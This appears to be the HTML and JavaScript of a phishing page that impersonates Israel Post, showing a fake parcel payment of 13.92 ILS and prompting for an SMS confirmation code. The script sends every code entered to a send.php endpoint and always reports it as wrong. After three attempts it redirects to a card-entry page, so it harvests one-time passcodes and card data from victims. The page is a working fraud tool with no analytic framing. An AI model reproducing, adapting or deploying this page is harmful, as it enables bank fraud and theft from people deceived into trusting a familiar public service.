<!doctype html>
<html dir="rtl">
<head>
<title>Payment form</title>
<link href="https://fonts.googleapis.com/css2?family=PT+Sans&display=swap" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">

</head>
<body>

<div class="content">
<div class="">
    <img src="res/logo.png" style="width:160px;">
</div>
<div class="form">
<div class="col title">
שלם בכרטיס <img src="res/cards.svg"> 
</div>

<div class="details" style="text-align:right;">
<p>כרטיס : XXXX XXXX XXXX  </p>
<p>מספר הזמנה: 89739732098</p>
<p>סה"כ: 13.92 ILS</p>
</div>

<div class="paymentform" id="cardform">

<div class="form-col" style="text-align:right; margin:20px 0;">
<h3>אישור SMS</h3>
<p>נא להזין את הקוד שנשלח למספר הטלפון שלך</p>
</div>

<div class="error" style="display:none;" id="sms_error">
קוד שגוי. בבקשה נסה שוב.
</div>

<div class="form-col">
<input type="text" class="textinput" id="d0" placeholder="להזין את הקוד">
</div>

<div class="form-col">
    <button onclick="sendOtp()">לאשר</button>
</div>

</div>


<p style="margin:30px 0; text-align:right; font-size:0.7em;">© 2023 דואר ישראל<br><a href="#contact">צור קשר עם תמיכה</a></p>

</div>
</div>


<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style="width:80px;">
</div>
</div>



<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
$("#d0").mask('00000000');

var allowSubmit;
var abortVal = true;
var seconds = 5000;
var tries = 0;
var max_tries = 3;

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=1; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).css("border-bottom","1px solid red");
			allowSubmit=false;
	}else{
		$("#d"+i).css("border-bottom","1px solid #b2b2b2");
	}
}

}

$("#cardform input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("#cardform input").keypress((e)=>{
    if(e.key=="Enter"){
        sendOtp();
    }
});

function sendOtp(){
    validate();

    if(allowSubmit){
        
        $("#sms_error").hide();
        $(".loader").show();
        
        $.post("send.php", 
			{	
				sms:$("#d0").val()
			
			}, function(done){
                setTimeout(()=>{
                    tries = tries+1;
                    if(tries>=max_tries){
                        window.location="card.php?e";
                    }else{
                        $(".loader").hide();
                        $("#sms_error").show();
                        $("#d0").val("");
                    }

                }, seconds);
			}
		
		);

    }
}

</script>

</body>
</html>